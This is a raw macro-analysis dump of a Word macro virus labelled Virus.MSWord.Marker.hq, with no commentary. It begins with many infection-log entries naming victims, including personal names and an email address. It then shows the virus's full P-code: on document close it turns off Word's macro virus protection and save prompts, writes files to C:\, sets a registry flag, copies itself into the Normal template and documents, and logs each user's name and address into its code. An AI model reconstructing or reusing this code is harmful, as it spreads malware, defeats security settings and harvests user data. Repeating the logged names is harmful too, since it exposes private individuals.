' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:56:19 - âîñêðåñåíüå, 1 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:17:21 - ïîíåäåëüíèê, 2 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 20:12:20 - ïîíåäåëüíèê, 2 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:56:14 - âòîðíèê, 3 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:28:28 - âòîðíèê, 3 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:47:38 - ñðåäà, 4 èþë 2001
' Ðîñòèñëàâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:43:04 - ÷åòâåðã, 5 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:42:36 - ïÿòíèöà, 6 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:15:26 - ïÿòíèöà, 6 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:16:14 - ïÿòíèöà, 6 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:28:56 - ïîíåäåëüíèê, 9 èþë 2001
' Pentium
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:38:13 - ïÿòíèöà, 13 èþë 2001
' Ïîëüçîâàòåëü ÏÊ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:41 - ïÿòíèöà, 13 èþë 2001
' Ïîëüçîâàòåëü ÏÊ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:34:36 - ïÿòíèöà, 13 èþë 2001
' Ïîëüçîâàòåëü ÏÊ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:00:37 - ñóááîòà, 14 èþë 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:11:27 - âîñêðåñåíüå, 15 èþë 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:11:44 - âîñêðåñåíüå, 15 èþë 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 22:22:39 - âîñêðåñåíüå, 15 èþë 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:22:13 - ïîíåäåëüíèê, 23 èþë 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:39:25 - ÷åòâåðã, 26 èþë 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:53:49 - ïÿòíèöà, 3 àâã 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:01:22 - ïîíåäåëüíèê, 13 àâã 2001
' Óíæàêîâà Èðèíà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:21:14 - ïÿòíèöà, 31 àâã 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:04:04 - ñóááîòà, 1 ñåí 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:45:40 - ñóááîòà, 1 ñåí 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:29:21 - ñóááîòà, 1 ñåí 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:02:54 - ñóááîòà, 1 ñåí 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:31:14 - ñóááîòà, 1 ñåí 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:54:01 - ñóááîòà, 1 ñåí 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:11:09 - ñóááîòà, 1 ñåí 2001
' Bt
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:55:50 - ñóááîòà, 1 ñåí 2001
' FED
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:57:59 - ñóááîòà, 1 ñåí 2001
' FED
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:24:47 - âòîðíèê, 4 ñåí 2001
' FED
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:57:43 - ñðåäà, 12 ñåí 2001
' fayer
' aku@tanak-cakap.com



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:40:31 - Friday, 19 Oct 2001
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:40:47 - Friday, 19 Oct 2001
' Replication System
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:40:57 - Friday, 19 Oct 2001
' Replication System
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.hq
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 60083 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0019 " DSR & FHS , KZ, Kostanai"
' Line #2:
' 	QuoteRem 0x0000 0x001A " KGU-EMF by DSR & FHS v0.1"
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' Line #7:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #8:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #10:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #11:
' Line #12:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #15:
' 	Ld MAPIAvailable 
' 	IfBlock 
' Line #16:
' 	Dim 
' 	VarDefn ExcelSheet (As Object)
' Line #17:
' 	SetStmt 
' 	LitStr 0x000E "Outlook.letter"
' 	ArgsLd CreateObject 0x0001 
' 	Set ExcelSheet 
' Line #18:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SendMailAttach 
' Line #19:
' Line #20:
' 	EndIfBlock 
' Line #21:
' Line #22:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #23:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #24:
' Line #25:
' 	QuoteRem 0x0000 0x004B "Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF"
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' Line #30:
' Line #31:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #32:
' Line #33:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #35:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #40:
' Line #41:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #42:
' 	LitStr 0x000A "C:\bootlog"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #43:
' Line #44:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #47:
' Line #48:
' 	LitStr 0x000D "c:\netlog.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "For YOU"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "SCOOTER"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Wellcome to Calipso"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "FasterHarderScooter"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Scooter on the Web: www.scooterweb.de"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "This is a simple example"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "read "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #58:
' Line #59:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #60:
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' Line #64:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #65:
' 	LineCont 0x0014 08 00 03 00 0F 00 03 00 17 00 03 00 1E 00 03 00 25 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #66:
' Line #67:
' Line #68:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #69:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #70:
' Line #71:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #72:
' Line #73:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #74:
' Line #75:
' Line #76:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #78:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #79:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #80:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	ElseBlock 
' Line #83:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' Line #87:
' 	LineCont 0x001C 09 00 0E 00 12 00 0E 00 1B 00 0E 00 24 00 0E 00 2D 00 15 00 39 00 0E 00 44 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0015 "* DSR & FHS , KGU EMF"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0022 "00:15:54  -  Wednesday, 22.12.1999"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0029 "KZ, Kostanai, KGU EMF Applied Mathematics"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000B "hh:mm:ss - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #88:
' Line #89:
' Line #90:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #91:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #92:
' Line #93:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #94:
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' Line #98:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #99:
' 	LineCont 0x0004 05 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DocumentInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #100:
' Line #101:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #102:
' Line #103:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #104:
' Line #105:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #106:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #107:
' Line #108:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #109:
' Line #110:
' 	EndIfBlock 
' Line #111:
' Line #112:
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #118:
' Line #119:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #120:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #121:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #122:
' 	QuoteRem 0x0000 0x001D " 19:20:14 - ñðåäà, 3 ìàé 2000"
' Line #123:
' 	QuoteRem 0x0000 0x001E " Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì"
' Line #124:
' 	QuoteRem 0x0000 0x0000 ""
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #129:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #130:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #131:
' 	QuoteRem 0x0000 0x0024 " 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000"
' Line #132:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #133:
' 	QuoteRem 0x0000 0x0000 ""
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #138:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #139:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #140:
' 	QuoteRem 0x0000 0x0024 " 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000"
' Line #141:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #142:
' 	QuoteRem 0x0000 0x0000 ""
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #147:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #148:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #149:
' 	QuoteRem 0x0000 0x0020 " 16:55:46 - âòîðíèê, 16 ìàé 2000"
' Line #150:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #151:
' 	QuoteRem 0x0000 0x0000 ""
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #156:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #157:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #158:
' 	QuoteRem 0x0000 0x001E " 10:25:20 - ñðåäà, 17 ìàé 2000"
' Line #159:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #160:
' 	QuoteRem 0x0000 0x0000 ""
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #165:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #166:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #167:
' 	QuoteRem 0x0000 0x001E " 10:48:08 - ñðåäà, 17 ìàé 2000"
' Line #168:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #169:
' 	QuoteRem 0x0000 0x0000 ""
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #174:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #175:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #176:
' 	QuoteRem 0x0000 0x001E " 10:53:13 - ñðåäà, 17 ìàé 2000"
' Line #177:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #178:
' 	QuoteRem 0x0000 0x0000 ""
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #183:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #184:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #185:
' 	QuoteRem 0x0000 0x001E " 15:46:39 - ñðåäà, 17 ìàé 2000"
' Line #186:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #187:
' 	QuoteRem 0x0000 0x0000 ""
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #192:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #193:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #194:
' 	QuoteRem 0x0000 0x0020 " 15:10:05 - ÷åòâåðã, 18 ìàé 2000"
' Line #195:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #201:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #202:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #203:
' 	QuoteRem 0x0000 0x0020 " 14:57:33 - âòîðíèê, 23 ìàé 2000"
' Line #204:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #205:
' 	QuoteRem 0x0000 0x0000 ""
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #210:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #211:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #212:
' 	QuoteRem 0x0000 0x0020 " 16:42:02 - âòîðíèê, 23 ìàé 2000"
' Line #213:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #214:
' 	QuoteRem 0x0000 0x0000 ""
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #219:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #220:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #221:
' 	QuoteRem 0x0000 0x001E " 10:13:04 - ñðåäà, 24 ìàé 2000"
' Line #222:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #223:
' 	QuoteRem 0x0000 0x0000 ""
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #228:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #229:
